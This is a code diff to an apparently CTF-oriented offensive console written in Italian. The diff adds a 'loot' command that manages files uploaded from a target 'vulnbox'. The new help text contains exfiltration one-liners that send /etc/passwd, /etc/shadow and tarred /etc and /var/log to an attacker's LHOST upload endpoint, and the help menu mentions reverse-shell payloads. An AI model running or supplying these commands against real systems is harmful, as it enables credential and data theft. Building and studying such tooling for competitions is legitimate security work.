@@ -15,7 +15,7 @@ from dataclasses import dataclass, field
 from pathlib import Path
 from shutil import get_terminal_size, which
 
-from http_server import start as _serve_start, stop as _serve_stop, status as _serve_status, fetch_tools as _serve_fetch, list_static as _serve_list_static, discover_interfaces as _serve_discover_interfaces, get_web_url as _serve_get_url
+from http_server import start as _serve_start, stop as _serve_stop, status as _serve_status, fetch_tools as _serve_fetch, list_static as _serve_list_static, discover_interfaces as _serve_discover_interfaces, get_web_url as _serve_get_url, list_loot as _serve_list_loot, read_loot as _serve_read_loot, clear_loot as _serve_clear_loot, LOOT_ROOT
 
 try:
     import readline  # type: ignore
@@ -317,6 +317,7 @@ def print_help_text() -> None:
     print("  notes <argomento>  Mostra una guida    (notes list per elenco)")
     print("  serve <azione>     Server HTTP di delivery (serve help per dettagli)")
     print("  serve list         Elenca i file in static/")
+    print("  loot [azione]      Gestisci file ricevuti dalla vulnbox (loot help)")
     print("  sealsay [testo]    Stampa un messaggio in stile cowsay")
     print("  back               Torna alla console principale")
     print("  help               Mostra questo aiuto")
@@ -458,6 +459,9 @@ def build_parser() -> argparse.ArgumentParser:
     serve_p.add_argument("--lhost", default=None)
     serve_p.add_argument("--lport", type=int, default=4444)
     serve_p.add_argument("--force", action="store_true", default=False)
+    loot_p = subparsers.add_parser("loot", add_help=False)
+    loot_p.add_argument("action", nargs="?", default="list")
+    loot_p.add_argument("target", nargs="?", default=None)
     return parser
 
 
@@ -473,7 +477,7 @@ def setup_readline() -> None:
 
 
 _COMPLETABLE = sorted(["sealsay", "list", "install", "use", "search", "vuln",
-                        "notes", "find", "back", "help", "serve", "exit"])
+                        "notes", "find", "back", "help", "serve", "loot", "exit"])
 _input_history: list[str] = []
 
 
@@ -694,6 +698,7 @@ def run_command(argv: list[str], state: ConsoleState | None = None) -> int:
         "notes": cmd_notes,
         "find": cmd_find,
         "serve": cmd_serve,
+        "loot": cmd_loot,
     }
     handler = handlers.get(args.command)
     if handler is None:
@@ -810,7 +815,7 @@ def run_console() -> int:
                     state.last_vuln_tools = _extract_vuln_tools(text)
                 continue
 
-        known_commands = {"sealsay", "list", "install", "use", "search", "vuln", "notes", "find", "back", "help", "?", "--version", "-h", "--help", "serve"}
+        known_commands = {"sealsay", "list", "install", "use", "search", "vuln", "notes", "find", "back", "help", "?", "--version", "-h", "--help", "serve", "loot"}
         if argv[0] not in known_commands:
             print("Comando non riconosciuto. Digita 'help' per i comandi.")
             continue
@@ -1253,6 +1258,7 @@ Serve payload dinamici e file statici via `curl` dal target.
 | `serve help rev` (o `r`) | Reverse shell Bash |
 | `serve help sh` | Reverse shell Python |
 | `serve help static` (o `s`) | Gestione file statici e catalogo tool |
+| `serve help loot` (o `l`) | Upload file dalla vulnbox e gestione loot |
 """)
 
 
@@ -1419,6 +1425,62 @@ def _serve_help_static() -> None:
     render_markdown("\n".join(lines))
 
 
+def _loot_help() -> None:
+    render_markdown(r"""# loot — Gestione File dalla Vulnbox
+
+Ricevi e gestisci file caricati dalla vulnbox tramite `curl` sull'endpoint `/upload`.
+I file vengono salvati nella cartella `loot/` con timestamp e IP sorgente.
+
+## Comandi
+
+| Comando | Descrizione |
+|---------|-------------|
+| `loot` o `loot list` | Elenca i file ricevuti |
+| `loot read <nome\|num>` | Mostra il contenuto di un file (solo testo) |
+| `loot clear` | Elimina tutti i file loot |
+| `loot help` | Mostra questo aiuto |
+
+## Come caricare file dalla vulnbox
+
+Dalla macchina vittima, usa `curl` per inviare file al server SLConsole:
+
+```bash
+# Upload file singolo (multipart form — il più comune)
+curl -F "file=@/etc/passwd" http://<LHOST>:2727/upload
+
+# Upload via pipe (utile per output di comandi)
+cat /etc/shadow | curl -X POST -d @- http://<LHOST>:2727/upload/shadow.txt
+
+# Upload con PUT (nome file nell'URL)
+curl -T /tmp/database.db http://<LHOST>:2727/upload/database.db
+
+# Esfiltra cartelle intere via tar
+tar czf - /etc /var/log | curl -X POST -d @- http://<LHOST>:2727/upload/exfil.tar.gz
+
+# Upload multipli in un colpo solo
+for f in /etc/passwd /etc/shadow /etc/hosts; do
+    curl -F "file=@$f" http://<LHOST>:2727/upload
+done
+```
+
+## Dove finiscono i file
+
+I file vengono salvati in `loot/` con il formato:
+
+```
+<IP_SORGENTE>_<DATA>_<ORA>_<NOME_ORIGINALE>
+```
+
+Esempio: `10.10.14.5_2024-01-15_14-30-22_passwd`
+
+## Consultare i file
+
+- **Console:** `loot list` per vedere i file, `loot read <num>` per il contenuto
+- **Web:** sezione **Loot** nella barra di navigazione di SLWeb
+- **Filesystem:** cartella `loot/` nella root del progetto
+""")
+
+
 _SERVE_HELP_TOPICS: dict[str, callable] = {
     "upgrade": _serve_help_upgrade,
     "u": _serve_help_upgrade,
@@ -1429,6 +1491,8 @@ _SERVE_HELP_TOPICS: dict[str, callable] = {
     "sh": _serve_help_sh,
     "static": _serve_help_static,
     "s": _serve_help_static,
+    "loot": _loot_help,
+    "l": _loot_help,
 }
 
 
@@ -1442,7 +1506,7 @@ def cmd_serve(args: argparse.Namespace, state: ConsoleState | None = None) -> in
                 handler()
             else:
                 print(f"Categoria sconosciuta: {subtopic}")
-                print("Categorie: upgrade (u), upgrade2 (u2), rev (r), sh, static (s)")
+                print("Categorie: upgrade (u), upgrade2 (u2), rev (r), sh, static (s), loot (l)")
         else:
             _serve_help_main()
         return 0
@@ -1490,6 +1554,48 @@ def cmd_serve(args: argparse.Namespace, state: ConsoleState | None = None) -> in
         return 0
     print(_serve_status())
     return 0
+
+
+def cmd_loot(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
+    action = normalize(getattr(args, "action", "list"))
+
+    if action in {"help", "h", "-h", "--help"}:
+        _loot_help()
+        return 0
+
+    if action in {"list", "ls", "l"}:
+        print(_serve_list_loot())
+        return 0
+
+    if action in {"read", "cat", "show", "view"}:
+        target = getattr(args, "target", None)
+        if not target:
+            print("Specifica il nome o il numero del file. Usa 'loot list' per vedere i file.", file=sys.stderr)
+            return 1
+        from http_server import _discover_loot
+        items = _discover_loot()
+        if target.isdigit():
+            idx = int(target) - 1
+            if 0 <= idx < len(items):
+                target = items[idx]["name"]
+            else:
+                print(f"Indice {int(target)} fuori range (1-{len(items)}).", file=sys.stderr)
+                return 1
+        content = _serve_read_loot(target)
+        if content is None:
+            print(f"File non trovato: {target}", file=sys.stderr)
+            return 1
+        print(f"\n\033[1m--- {target} ---\033[0m\n")
+        _paged_print(content.splitlines())
+        return 0
+
+    if action in {"clear", "clean", "purge"}:
+        print(_serve_clear_loot())
+        return 0
+
+    print(f"Azione sconosciuta: {action}")
+    print("Azioni disponibili: list, read <nome|num>, clear, help")
+    return 1
 
 
 def cmd_find(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
